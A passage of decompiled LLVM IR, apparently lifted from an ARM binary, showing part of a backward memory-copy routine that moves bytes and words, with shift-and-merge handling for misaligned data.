  %v6_15a1c = load i32, i32* %r2.global-to-local, align 4
  %v7_15a1c = add i32 %v6_15a1c, -12
  store i32 %v7_15a1c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_15a3c45 = phi i32 [ %v6_15a18, %.thread2 ], [ %v7_15a18, %bb148 ]
  %v0_15a2443 = phi i32 [ %v4_15a10, %.thread2 ], [ %v7_15a1c, %bb148 ]
  %v2_15a20 = load i8*, i8** %stack_var_-8, align 4
  %v3_15a20 = ptrtoint i8* %v2_15a20 to i32
  store i32 %v3_15a20, i32* @r4, align 4
  store i32 %v8_159dc, i32* @lr, align 4
  br label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_159d4, %.thread4
  %v7_15a34 = phi i32 [ %v0_159ec37, %dec_label_pc_159d4 ], [ %v6_15a3c45, %.thread4 ]
  %v0_15a24 = phi i32 [ %v2_159d4, %dec_label_pc_159d4 ], [ %v0_15a2443, %.thread4 ]
  %v2_15a24 = add i32 %v0_15a24, 8
  store i32 %v2_15a24, i32* %r2.global-to-local, align 4
  %v4_15a24 = sub i32 0, %v0_15a24
  %v5_15a24 = and i32 %v2_15a24, %v4_15a24
  %v6_15a24 = icmp slt i32 %v5_15a24, 0
  store i1 %v6_15a24, i1* %cpsr_v.global-to-local, align 1
  %v7_15a24 = icmp slt i32 %v2_15a24, 0
  store i1 %v7_15a24, i1* %cpsr_n.global-to-local, align 1
  %v8_15a24 = icmp eq i32 %v2_15a24, 0
  store i1 %v8_15a24, i1* %cpsr_z.global-to-local, align 1
  %v5_15a28 = icmp slt i32 %v0_15a24, -8
  br i1 %v5_15a28, label %bb150, label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_15a24
  %v6_15a2c = add i32 %v0_15a24, 4
  store i32 %v6_15a2c, i32* %r2.global-to-local, align 4
  %v8_15a2c = sub i32 -5, %v0_15a24
  %v9_15a2c = and i32 %v8_15a2c, %v2_15a24
  %v10_15a2c = icmp slt i32 %v9_15a2c, 0
  store i1 %v10_15a2c, i1* %cpsr_v.global-to-local, align 1
  %v11_15a2c = icmp slt i32 %v6_15a2c, 0
  store i1 %v11_15a2c, i1* %cpsr_n.global-to-local, align 1
  %v12_15a2c = icmp eq i32 %v2_15a24, 4
  store i1 %v12_15a2c, i1* %cpsr_z.global-to-local, align 1
  %v5_15a30 = icmp slt i32 %v2_15a24, 4
  %v6_15a30 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a30 = add i32 %v6_15a30, -4
  %v8_15a30 = inttoptr i32 %v7_15a30 to i32*
  %v9_15a30 = load i32, i32* %v8_15a30, align 4
  store i32 %v9_15a30, i32* @r3, align 4
  br i1 %v5_15a30, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_15a2c
  store i32 %v7_15a30, i32* %r1.global-to-local, align 4
  %v8_15a34 = add i32 %v7_15a34, -4
  %v9_15a34 = inttoptr i32 %v8_15a34 to i32*
  store i32 %v9_15a30, i32* %v9_15a34, align 4
  %v10_15a34 = load i32, i32* %r0.global-to-local, align 4
  %v11_15a34 = add i32 %v10_15a34, -4
  store i32 %v11_15a34, i32* %r0.global-to-local, align 4
  %v0_15a44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_15a2c
  %v10_15a38 = add i32 %v6_15a30, -8
  %v11_15a38 = inttoptr i32 %v10_15a38 to i32*
  %v12_15a38 = load i32, i32* %v11_15a38, align 4
  store i32 %v12_15a38, i32* @ip, align 4
  store i32 %v10_15a38, i32* %r1.global-to-local, align 4
  %v7_15a3c = add i32 %v7_15a34, -8
  %v8_15a3c = inttoptr i32 %v7_15a3c to i32*
  store i32 %v9_15a30, i32* %v8_15a3c, align 4
  %v10_15a3c = add i32 %v7_15a34, -4
  %v11_15a3c = inttoptr i32 %v10_15a3c to i32*
  %v12_15a3c = load i32, i32* @ip, align 4
  store i32 %v12_15a3c, i32* %v11_15a3c, align 4
  store i32 %v7_15a3c, i32* %r0.global-to-local, align 4
  %v6_15a40 = load i32, i32* %r2.global-to-local, align 4
  %v7_15a40 = add i32 %v6_15a40, -4
  store i32 %v7_15a40, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_15a24, %dec_label_pc_159b4, %dec_label_pc_15be8, %dec_label_pc_15b7c, %dec_label_pc_15b10, %bb149
  %v2_15a48 = phi i32 [ %v11_15a34, %.thread8 ], [ %v0_15ae020, %.thread14 ], [ %v7_15a34, %dec_label_pc_15a24 ], [ %v2_159b8, %dec_label_pc_159b4 ], [ %v2_15a5453, %dec_label_pc_15be8 ], [ %v2_15a5452, %dec_label_pc_15b7c ], [ %v2_15a5451, %dec_label_pc_15b10 ], [ %v7_15a3c, %bb149 ]
  %v0_15a44 = phi i32 [ %v0_15a44.pre, %.thread8 ], [ %v2_15a88, %.thread14 ], [ %v2_15a24, %dec_label_pc_15a24 ], [ %v2_159bc, %dec_label_pc_159b4 ], [ %v0_15a4449, %dec_label_pc_15be8 ], [ %v0_15a4448, %dec_label_pc_15b7c ], [ %v0_15a4447, %dec_label_pc_15b10 ], [ %v7_15a40, %bb149 ]
  %v1_15a44 = add i32 %v0_15a44, 4
  store i32 %v1_15a44, i32* %r2.global-to-local, align 4
  %v3_15a44 = sub i32 0, %v0_15a44
  %v4_15a44 = and i32 %v1_15a44, %v3_15a44
  %v5_15a44 = icmp slt i32 %v4_15a44, 0
  store i1 %v5_15a44, i1* %cpsr_v.global-to-local, align 1
  %v6_15a44 = icmp slt i32 %v1_15a44, 0
  store i1 %v6_15a44, i1* %cpsr_n.global-to-local, align 1
  %v7_15a44 = icmp eq i32 %v1_15a44, 0
  store i1 %v7_15a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15a44, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_15a4c = add i32 %v0_15a44, 2
  %v3_15a4c = sub i32 -3, %v0_15a44
  %v4_15a4c = and i32 %v3_15a4c, %v1_15a44
  %v5_15a4c = icmp slt i32 %v4_15a4c, 0
  store i1 %v5_15a4c, i1* %cpsr_v.global-to-local, align 1
  %v6_15a4c = icmp slt i32 %v1_15a4c, 0
  store i1 %v6_15a4c, i1* %cpsr_n.global-to-local, align 1
  %v7_15a4c = icmp eq i32 %v1_15a44, 2
  store i1 %v7_15a4c, i1* %cpsr_z.global-to-local, align 1
  %v0_15a50 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a50 = add i32 %v0_15a50, -1
  %v2_15a50 = inttoptr i32 %v1_15a50 to i8*
  %v3_15a50 = load i8, i8* %v2_15a50, align 1
  %v4_15a50 = zext i8 %v3_15a50 to i32
  store i32 %v4_15a50, i32* @r3, align 4
  store i32 %v1_15a50, i32* %r1.global-to-local, align 4
  %v3_15a54 = add i32 %v2_15a48, -1
  %v4_15a54 = inttoptr i32 %v3_15a54 to i8*
  store i8 %v3_15a50, i8* %v4_15a54, align 1
  %v5_15a54 = load i32, i32* %r0.global-to-local, align 4
  %v6_15a54 = add i32 %v5_15a54, -1
  store i32 %v6_15a54, i32* %r0.global-to-local, align 4
  %v0_15a58 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15a58 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15a58 = xor i1 %v0_15a58, %v1_15a58
  br i1 %v2_15a58, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_15a58 = load i32, i32* %r1.global-to-local, align 4
  %v4_15a58 = add i32 %v3_15a58, -1
  %v5_15a58 = inttoptr i32 %v4_15a58 to i8*
  %v6_15a58 = load i8, i8* %v5_15a58, align 1
  %v7_15a58 = zext i8 %v6_15a58 to i32
  store i32 %v7_15a58, i32* @r3, align 4
  store i32 %v4_15a58, i32* %r1.global-to-local, align 4
  %v6_15a5c = add i32 %v5_15a54, -2
  %v7_15a5c = inttoptr i32 %v6_15a5c to i8*
  store i8 %v6_15a58, i8* %v7_15a5c, align 1
  %v8_15a5c = load i32, i32* %r0.global-to-local, align 4
  %v9_15a5c = add i32 %v8_15a5c, -1
  store i32 %v9_15a5c, i32* %r0.global-to-local, align 4
  %v1_15a60.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15a60.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_15a64 = phi i32 [ %v9_15a5c, %bb152 ], [ %v6_15a54, %bb151 ]
  %v2_15a64 = phi i1 [ %v2_15a60.pre, %bb152 ], [ %v1_15a58, %bb151 ]
  %v1_15a64 = phi i1 [ %v1_15a60.pre, %bb152 ], [ %v0_15a58, %bb151 ]
  %v0_15a60 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15a60 = xor i1 %v2_15a64, %v1_15a64
  %v4_15a60 = or i1 %v0_15a60, %v3_15a60
  br i1 %v4_15a60, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_15a60 = load i32, i32* %r1.global-to-local, align 4
  %v6_15a60 = add i32 %v5_15a60, -1
  %v7_15a60 = inttoptr i32 %v6_15a60 to i8*
  %v8_15a60 = load i8, i8* %v7_15a60, align 1
  %v9_15a60 = zext i8 %v8_15a60 to i32
  store i32 %v9_15a60, i32* @r3, align 4
  store i32 %v6_15a60, i32* %r1.global-to-local, align 4
  %v8_15a64 = add i32 %v7_15a64, -1
  %v9_15a64 = inttoptr i32 %v8_15a64 to i8*
  store i8 %v8_15a60, i8* %v9_15a64, align 1
  %v10_15a64 = load i32, i32* %r0.global-to-local, align 4
  %v11_15a64 = add i32 %v10_15a64, -1
  store i32 %v11_15a64, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_159c4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15a6c = icmp eq i32 %v1_159c4, 1
  store i1 %v8_15a6c, i1* %cpsr_n.global-to-local, align 1
  %v9_15a6c = icmp eq i32 %v1_159c4, 2
  store i1 %v9_15a6c, i1* %cpsr_z.global-to-local, align 1
  %v1_15a70 = add i32 %v2_159b4, -1
  %v2_15a70 = inttoptr i32 %v1_15a70 to i8*
  %v3_15a70 = load i8, i8* %v2_15a70, align 1
  %v4_15a70 = zext i8 %v3_15a70 to i32
  store i32 %v4_15a70, i32* @r3, align 4
  store i32 %v1_15a70, i32* %r1.global-to-local, align 4
  %v3_15a74 = add i32 %v2_159b8, -1
  %v4_15a74 = inttoptr i32 %v3_15a74 to i8*
  store i8 %v3_15a70, i8* %v4_15a74, align 1
  %v5_15a74 = load i32, i32* %r0.global-to-local, align 4
  %v6_15a74 = add i32 %v5_15a74, -1
  store i32 %v6_15a74, i32* %r0.global-to-local, align 4
  br i1 %v8_15a6c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_15a6c
  %v6_15a78 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a78 = add i32 %v6_15a78, -1
  %v8_15a78 = inttoptr i32 %v7_15a78 to i8*
  %v9_15a78 = load i8, i8* %v8_15a78, align 1
  %v10_15a78 = zext i8 %v9_15a78 to i32
  store i32 %v10_15a78, i32* @r3, align 4
  store i32 %v7_15a78, i32* %r1.global-to-local, align 4
  %v9_15a7c = add i32 %v5_15a74, -2
  %v10_15a7c = inttoptr i32 %v9_15a7c to i8*
  store i8 %v9_15a78, i8* %v10_15a7c, align 1
  %v11_15a7c = load i32, i32* %r0.global-to-local, align 4
  %v12_15a7c = add i32 %v11_15a7c, -1
  store i32 %v12_15a7c, i32* %r0.global-to-local, align 4
  br i1 %v9_15a6c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_15a80 = load i32, i32* %r1.global-to-local, align 4
  %v9_15a80 = add i32 %v8_15a80, -1
  %v10_15a80 = inttoptr i32 %v9_15a80 to i8*
  %v11_15a80 = load i8, i8* %v10_15a80, align 1
  %v12_15a80 = zext i8 %v11_15a80 to i32
  store i32 %v12_15a80, i32* @r3, align 4
  store i32 %v9_15a80, i32* %r1.global-to-local, align 4
  %v11_15a84 = add i32 %v11_15a7c, -2
  %v12_15a84 = inttoptr i32 %v11_15a84 to i8*
  store i8 %v11_15a80, i8* %v12_15a84, align 1
  %v13_15a84 = load i32, i32* %r0.global-to-local, align 4
  %v14_15a84 = add i32 %v13_15a84, -1
  store i32 %v14_15a84, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_15a6c, %bb155
  %v0_15ae020 = phi i32 [ %v12_15a7c, %bb154 ], [ %v6_15a74, %dec_label_pc_15a6c ], [ %v14_15a84, %bb155 ]
  %v0_15a88 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a88 = load i32, i32* @ip, align 4
  %v2_15a88 = sub i32 %v0_15a88, %v1_15a88
  store i32 %v2_15a88, i32* %r2.global-to-local, align 4
  %v4_15a88 = xor i32 %v1_15a88, %v0_15a88
  %v5_15a88 = xor i32 %v2_15a88, %v0_15a88
  %v6_15a88 = and i32 %v5_15a88, %v4_15a88
  %v7_15a88 = icmp slt i32 %v6_15a88, 0
  store i1 %v7_15a88, i1* %cpsr_v.global-to-local, align 1
  %v8_15a88 = icmp slt i32 %v2_15a88, 0
  store i1 %v8_15a88, i1* %cpsr_n.global-to-local, align 1
  %v9_15a88 = icmp eq i32 %v0_15a88, %v1_15a88
  store i1 %v9_15a88, i1* %cpsr_z.global-to-local, align 1
  %v5_15a8c = icmp slt i32 %v0_15a88, %v1_15a88
  br i1 %v5_15a8c, label %bb150, label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %.thread14
  %v0_15a90 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a90 = urem i32 %v0_15a90, 4
  store i32 %v1_15a90, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15a90 = icmp eq i32 %v1_15a90, 0
  store i1 %v2_15a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a90, label %dec_label_pc_159d4, label %dec_label_pc_15a98

dec_label_pc_15a98:                               ; preds = %dec_label_pc_159cc, %dec_label_pc_15a90
  %v0_15ae019 = phi i32 [ %v2_159b8, %dec_label_pc_159cc ], [ %v0_15ae020, %dec_label_pc_15a90 ]
  %v0_15b8c = phi i32 [ %v2_159bc, %dec_label_pc_159cc ], [ %v2_15a88, %dec_label_pc_15a90 ]
  %v0_15a98 = phi i32 [ %v2_159b4, %dec_label_pc_159cc ], [ %v0_15a90, %dec_label_pc_15a90 ]
  %v0_15aa0 = phi i32 [ %v1_159cc, %dec_label_pc_159cc ], [ %v1_15a90, %dec_label_pc_15a90 ]
  %v1_15a98 = and i32 %v0_15a98, -4
  store i32 %v1_15a98, i32* %r1.global-to-local, align 4
  %v1_15a9c = inttoptr i32 %v1_15a98 to i32*
  %v2_15a9c = load i32, i32* %v1_15a9c, align 4
  store i32 %v2_15a9c, i32* @r3, align 4
  %v7_15aa0 = icmp ult i32 %v0_15aa0, 2
  %v2_15b84 = add i32 %v0_15b8c, -12
  %v4_15b84 = sub i32 11, %v0_15b8c
  %v5_15b84 = and i32 %v4_15b84, %v0_15b8c
  %v6_15b84 = icmp slt i32 %v5_15b84, 0
  store i1 %v6_15b84, i1* %cpsr_v.global-to-local, align 1
  %v7_15b84 = icmp slt i32 %v2_15b84, 0
  store i1 %v7_15b84, i1* %cpsr_n.global-to-local, align 1
  %v8_15b84 = icmp eq i32 %v0_15b8c, 12
  store i1 %v8_15b84, i1* %cpsr_z.global-to-local, align 1
  %v5_15b88 = icmp slt i32 %v0_15b8c, 12
  br i1 %v7_15aa0, label %dec_label_pc_15b84, label %dec_label_pc_15aa8

dec_label_pc_15aa8:                               ; preds = %dec_label_pc_15a98
  %v8_15aa0 = icmp eq i32 %v0_15aa0, 2
  br i1 %v8_15aa0, label %dec_label_pc_15b18, label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %dec_label_pc_15aa8
  br i1 %v5_15b88, label %dec_label_pc_15af8, label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15aac
  store i32 %v2_15b84, i32* %r2.global-to-local, align 4
  %v3_15ab8 = load i32, i32* @r4, align 4
  store i32 %v3_15ab8, i32* %stack_var_-12, align 4
  %v6_15ab8 = load i32, i32* @r5, align 4
  %v8_15ab8 = inttoptr i32 %v6_15ab8 to i8*
  store i8* %v8_15ab8, i8** %stack_var_-8, align 4
  %v11_15ab8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15abc

dec_label_pc_15abc:                               ; preds = %dec_label_pc_15abc.dec_label_pc_15abc_crit_edge, %dec_label_pc_15ab4
  %v0_15ae0 = phi i32 [ %v1_15ae0, %dec_label_pc_15abc.dec_label_pc_15abc_crit_edge ], [ %v0_15ae019, %dec_label_pc_15ab4 ]
  %v0_15ac0 = phi i32 [ %v0_15ac0.pre, %dec_label_pc_15abc.dec_label_pc_15abc_crit_edge ], [ %v1_15a98, %dec_label_pc_15ab4 ]
  %v0_15abc = phi i32 [ %v0_15abc.pre, %dec_label_pc_15abc.dec_label_pc_15abc_crit_edge ], [ %v2_15a9c, %dec_label_pc_15ab4 ]
  %v3_15abc = mul i32 %v0_15abc, 256
  store i32 %v3_15abc, i32* %lr.global-to-local, align 4
  %v1_15ac0 = add i32 %v0_15ac0, -4
  %v2_15ac0 = inttoptr i32 %v1_15ac0 to i32*
  %v3_15ac0 = load i32, i32* %v2_15ac0, align 4
  store i32 %v3_15ac0, i32* @r3, align 4
  %v4_15ac0 = add i32 %v0_15ac0, -8
  %v5_15ac0 = inttoptr i32 %v4_15ac0 to i32*
  %v6_15ac0 = load i32, i32* %v5_15ac0, align 4
  store i32 %v6_15ac0, i32* %r4.global-to-local, align 4
  %v7_15ac0 = add i32 %v0_15ac0, -12
  %v8_15ac0 = inttoptr i32 %v7_15ac0 to i32*
  %v9_15ac0 = load i32, i32* %v8_15ac0, align 4
  store i32 %v9_15ac0, i32* %r5.global-to-local, align 4
  %v10_15ac0 = add i32 %v0_15ac0, -16
  %v11_15ac0 = inttoptr i32 %v10_15ac0 to i32*
  %v12_15ac0 = load i32, i32* %v11_15ac0, align 4
  store i32 %v10_15ac0, i32* %r1.global-to-local, align 4
  %v4_15ac4 = udiv i32 %v12_15ac0, 16777216
  %v5_15ac4 = or i32 %v4_15ac4, %v3_15abc
  store i32 %v5_15ac4, i32* %lr.global-to-local, align 4
  %v3_15ac8 = mul i32 %v12_15ac0, 256
  %v4_15acc = udiv i32 %v9_15ac0, 16777216
  %v5_15acc = or i32 %v3_15ac8, %v4_15acc
  store i32 %v5_15acc, i32* @ip, align 4
  %v3_15ad0 = mul i32 %v9_15ac0, 256
  %v4_15ad4 = udiv i32 %v6_15ac0, 16777216
  %v5_15ad4 = or i32 %v3_15ad0, %v4_15ad4
  store i32 %v5_15ad4, i32* %r5.global-to-local, align 4
  %v3_15ad8 = mul i32 %v6_15ac0, 256
  %v4_15adc = udiv i32 %v3_15ac0, 16777216
  %v5_15adc = or i32 %v3_15ad8, %v4_15adc
  store i32 %v5_15adc, i32* %r4.global-to-local, align 4
  %v1_15ae0 = add i32 %v0_15ae0, -16
  %v2_15ae0 = inttoptr i32 %v1_15ae0 to i32*
  store i32 %v5_15adc, i32* %v2_15ae0, align 4
  %v4_15ae0 = add i32 %v0_15ae0, -12
  %v5_15ae0 = inttoptr i32 %v4_15ae0 to i32*
  %v6_15ae0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15ae0, i32* %v5_15ae0, align 4
  %v7_15ae0 = add i32 %v0_15ae0, -8
  %v8_15ae0 = inttoptr i32 %v7_15ae0 to i32*
  %v9_15ae0 = load i32, i32* @ip, align 4
  store i32 %v9_15ae0, i32* %v8_15ae0, align 4
  %v10_15ae0 = add i32 %v0_15ae0, -4
  %v11_15ae0 = inttoptr i32 %v10_15ae0 to i32*
  %v12_15ae0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15ae0, i32* %v11_15ae0, align 4
  store i32 %v1_15ae0, i32* %r0.global-to-local, align 4
  %v0_15ae4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ae4 = add i32 %v0_15ae4, -16
  store i32 %v2_15ae4, i32* %r2.global-to-local, align 4
  %v6_15ae8 = icmp slt i32 %v0_15ae4, 16
  br i1 %v6_15ae8, label %dec_label_pc_15aec, label %dec_label_pc_15abc.dec_label_pc_15abc_crit_edge

dec_label_pc_15abc.dec_label_pc_15abc_crit_edge:  ; preds = %dec_label_pc_15abc
  %v0_15abc.pre = load i32, i32* @r3, align 4
  %v0_15ac0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15abc

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15abc
  %v2_15aec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15aec, i32* @r4, align 4
  %v5_15aec = load i8*, i8** %stack_var_-8, align 4
  %v6_15aec = ptrtoint i8* %v5_15aec to i32
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v11_15ab8, i32* @lr, align 4
  %v2_15af0 = add i32 %v0_15ae4, -4
  store i32 %v2_15af0, i32* %r2.global-to-local, align 4
  %v4_15af0 = add i32 %v0_15ae4, 2147483632
  %v5_15af0 = and i32 %v2_15af0, %v4_15af0
  %v6_15af0 = icmp slt i32 %v5_15af0, 0
  store i1 %v6_15af0, i1* %cpsr_v.global-to-local, align 1
  %v7_15af0 = icmp slt i32 %v2_15af0, 0
  store i1 %v7_15af0, i1* %cpsr_n.global-to-local, align 1
  %v8_15af0 = icmp eq i32 %v2_15af0, 0
  store i1 %v8_15af0, i1* %cpsr_z.global-to-local, align 1
  %v5_15af4 = icmp slt i32 %v2_15ae4, -12
  br i1 %v5_15af4, label %dec_label_pc_15b10, label %dec_label_pc_15af8

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15aec, %dec_label_pc_15aac, %dec_label_pc_15af8
  %v1_15b04 = phi i32 [ %v5_15b04, %dec_label_pc_15af8 ], [ %v1_15ae0, %dec_label_pc_15aec ], [ %v0_15ae019, %dec_label_pc_15aac ]
  %v0_15af8 = load i32, i32* @r3, align 4
  %v3_15af8 = mul i32 %v0_15af8, 256
  store i32 %v3_15af8, i32* %ip.global-to-local, align 4
  %v0_15afc = load i32, i32* %r1.global-to-local, align 4
  %v1_15afc = add i32 %v0_15afc, -4
  %v2_15afc = inttoptr i32 %v1_15afc to i32*
  %v3_15afc = load i32, i32* %v2_15afc, align 4
  store i32 %v3_15afc, i32* @r3, align 4
  store i32 %v1_15afc, i32* %r1.global-to-local, align 4
  %v4_15b00 = udiv i32 %v3_15afc, 16777216
  %v5_15b00 = or i32 %v4_15b00, %v3_15af8
  store i32 %v5_15b00, i32* @ip, align 4
  %v2_15b04 = add i32 %v1_15b04, -4
  %v3_15b04 = inttoptr i32 %v2_15b04 to i32*
  store i32 %v5_15b00, i32* %v3_15b04, align 4
  %v4_15b04 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b04 = add i32 %v4_15b04, -4
  store i32 %v5_15b04, i32* %r0.global-to-local, align 4
  %v0_15b08 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b08 = add i32 %v0_15b08, -4
  store i32 %v2_15b08, i32* %r2.global-to-local, align 4
  %v6_15b0c = icmp slt i32 %v0_15b08, 4
  br i1 %v6_15b0c, label %dec_label_pc_15b10.loopexit, label %dec_label_pc_15af8

dec_label_pc_15b10.loopexit:                      ; preds = %dec_label_pc_15af8
  %v4_15b08 = sub i32 3, %v0_15b08
  %v5_15b08 = and i32 %v4_15b08, %v0_15b08
  %v6_15b08 = icmp slt i32 %v5_15b08, 0
  %v7_15b08 = icmp slt i32 %v2_15b08, 0
  store i1 %v6_15b08, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b08, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b10.loopexit, %dec_label_pc_15aec
  %v2_15a5451 = phi i32 [ %v5_15b04, %dec_label_pc_15b10.loopexit ], [ %v1_15ae0, %dec_label_pc_15aec ]
  %v0_15a4447 = phi i32 [ %v2_15b08, %dec_label_pc_15b10.loopexit ], [ %v2_15af0, %dec_label_pc_15aec ]
  %v0_15b10 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b10 = add i32 %v0_15b10, 3
  store i32 %v1_15b10, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15b18:                               ; preds = %dec_label_pc_15aa8
  br i1 %v5_15b88, label %dec_label_pc_15b64, label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b18
  store i32 %v2_15b84, i32* %r2.global-to-local, align 4
  %v3_15b24 = load i32, i32* @r4, align 4
  store i32 %v3_15b24, i32* %stack_var_-12, align 4
  %v6_15b24 = load i32, i32* @r5, align 4
  %v8_15b24 = inttoptr i32 %v6_15b24 to i8*
  store i8* %v8_15b24, i8** %stack_var_-8, align 4
  %v11_15b24 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15b28

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b28.dec_label_pc_15b28_crit_edge, %dec_label_pc_15b20
  %v0_15b4c = phi i32 [ %v1_15b4c, %dec_label_pc_15b28.dec_label_pc_15b28_crit_edge ], [ %v0_15ae019, %dec_label_pc_15b20 ]
  %v0_15b2c = phi i32 [ %v0_15b2c.pre, %dec_label_pc_15b28.dec_label_pc_15b28_crit_edge ], [ %v1_15a98, %dec_label_pc_15b20 ]
  %v0_15b28 = phi i32 [ %v0_15b28.pre, %dec_label_pc_15b28.dec_label_pc_15b28_crit_edge ], [ %v2_15a9c, %dec_label_pc_15b20 ]
  %v3_15b28 = mul i32 %v0_15b28, 65536
  store i32 %v3_15b28, i32* %lr.global-to-local, align 4
  %v1_15b2c = add i32 %v0_15b2c, -4
  %v2_15b2c = inttoptr i32 %v1_15b2c to i32*
  %v3_15b2c = load i32, i32* %v2_15b2c, align 4
  store i32 %v3_15b2c, i32* @r3, align 4
  %v4_15b2c = add i32 %v0_15b2c, -8
  %v5_15b2c = inttoptr i32 %v4_15b2c to i32*
  %v6_15b2c = load i32, i32* %v5_15b2c, align 4
  store i32 %v6_15b2c, i32* %r4.global-to-local, align 4
  %v7_15b2c = add i32 %v0_15b2c, -12
  %v8_15b2c = inttoptr i32 %v7_15b2c to i32*
  %v9_15b2c = load i32, i32* %v8_15b2c, align 4
  store i32 %v9_15b2c, i32* %r5.global-to-local, align 4
  %v10_15b2c = add i32 %v0_15b2c, -16
  %v11_15b2c = inttoptr i32 %v10_15b2c to i32*
  %v12_15b2c = load i32, i32* %v11_15b2c, align 4
  store i32 %v10_15b2c, i32* %r1.global-to-local, align 4
  %v4_15b30 = udiv i32 %v12_15b2c, 65536
  %v5_15b30 = or i32 %v4_15b30, %v3_15b28
  store i32 %v5_15b30, i32* %lr.global-to-local, align 4
  %v3_15b34 = mul i32 %v12_15b2c, 65536
  %v4_15b38 = udiv i32 %v9_15b2c, 65536
  %v5_15b38 = or i32 %v3_15b34, %v4_15b38
  store i32 %v5_15b38, i32* @ip, align 4
  %v3_15b3c = mul i32 %v9_15b2c, 65536
  %v4_15b40 = udiv i32 %v6_15b2c, 65536
  %v5_15b40 = or i32 %v3_15b3c, %v4_15b40
  store i32 %v5_15b40, i32* %r5.global-to-local, align 4
  %v3_15b44 = mul i32 %v6_15b2c, 65536
  %v4_15b48 = udiv i32 %v3_15b2c, 65536
  %v5_15b48 = or i32 %v3_15b44, %v4_15b48
  store i32 %v5_15b48, i32* %r4.global-to-local, align 4
  %v1_15b4c = add i32 %v0_15b4c, -16
  %v2_15b4c = inttoptr i32 %v1_15b4c to i32*
  store i32 %v5_15b48, i32* %v2_15b4c, align 4
  %v4_15b4c = add i32 %v0_15b4c, -12
  %v5_15b4c = inttoptr i32 %v4_15b4c to i32*
  %v6_15b4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15b4c, i32* %v5_15b4c, align 4
  %v7_15b4c = add i32 %v0_15b4c, -8
  %v8_15b4c = inttoptr i32 %v7_15b4c to i32*
  %v9_15b4c = load i32, i32* @ip, align 4
  store i32 %v9_15b4c, i32* %v8_15b4c, align 4
  %v10_15b4c = add i32 %v0_15b4c, -4
  %v11_15b4c = inttoptr i32 %v10_15b4c to i32*
  %v12_15b4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b4c, i32* %v11_15b4c, align 4
  store i32 %v1_15b4c, i32* %r0.global-to-local, align 4
  %v0_15b50 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b50 = add i32 %v0_15b50, -16
  store i32 %v2_15b50, i32* %r2.global-to-local, align 4
  %v6_15b54 = icmp slt i32 %v0_15b50, 16
  br i1 %v6_15b54, label %dec_label_pc_15b58, label %dec_label_pc_15b28.dec_label_pc_15b28_crit_edge

dec_label_pc_15b28.dec_label_pc_15b28_crit_edge:  ; preds = %dec_label_pc_15b28
  %v0_15b28.pre = load i32, i32* @r3, align 4
  %v0_15b2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b28

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b28
  %v2_15b58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15b58, i32* @r4, align 4
  %v5_15b58 = load i8*, i8** %stack_var_-8, align 4
  %v6_15b58 = ptrtoint i8* %v5_15b58 to i32
  store i32 %v6_15b58, i32* @r5, align 4
  store i32 %v11_15b24, i32* @lr, align 4
  %v2_15b5c = add i32 %v0_15b50, -4
